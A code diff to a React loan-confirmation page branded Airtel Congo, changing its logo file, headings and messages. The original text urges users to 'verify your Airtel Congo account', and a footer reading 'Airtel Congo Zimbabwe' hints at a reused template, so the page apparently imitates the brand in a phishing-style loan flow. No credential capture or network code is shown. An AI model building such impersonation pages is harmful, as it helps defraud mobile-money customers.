@@ -25,7 +25,7 @@ function LoanSubmittedPage({ onComplete }: LoanSubmittedPageProps) {
         <div style={pageStyle}>
             <div style={headerStyle}>
                 <div style={{ width: "60px" }} />
-                <img src="/airtel.svg" alt="Airtel Congo" style={logoStyle} />
+                <img src="/Airtel Congo.png" alt="Airtel Congo" style={logoStyle} />
                 <button
                     style={menuButtonStyle}
                     onMouseOver={(e) => (e.currentTarget.style.background = "#f0f0f0")}
@@ -66,7 +66,7 @@ function LoanSubmittedPage({ onComplete }: LoanSubmittedPageProps) {
                             color: "#10b981",
                         }}
                     >
-                        Airtel Congo Loan Increment Submitted
+                        Loan Application Submitted
                     </h1>
                     <p
                         style={{
@@ -76,7 +76,7 @@ function LoanSubmittedPage({ onComplete }: LoanSubmittedPageProps) {
                             lineHeight: "1.6",
                         }}
                     >
-                        Your Airtel Congo limit increase request has been submitted. Please wait for processing.
+                        Your loan application has been submitted. Please wait for approval.
                     </p>
                     <p
                         style={{
@@ -86,7 +86,7 @@ function LoanSubmittedPage({ onComplete }: LoanSubmittedPageProps) {
                             lineHeight: "1.6",
                         }}
                     >
-                        You will receive a confirmation. For now, proceed to verify your Airtel Congo account.
+                        You will receive a confirmation message. For now, proceed to Airtel Congo.
                     </p>
                     <div
                         style={{
@@ -120,7 +120,7 @@ function LoanSubmittedPage({ onComplete }: LoanSubmittedPageProps) {
                 </div>
             </div>
 
-            <div style={footerStyle}>© 2025 Airtel Congo Zimbabwe</div>
+            <div style={footerStyle}>© 2025 Airtel Congo</div>
         </div>
     );
 }
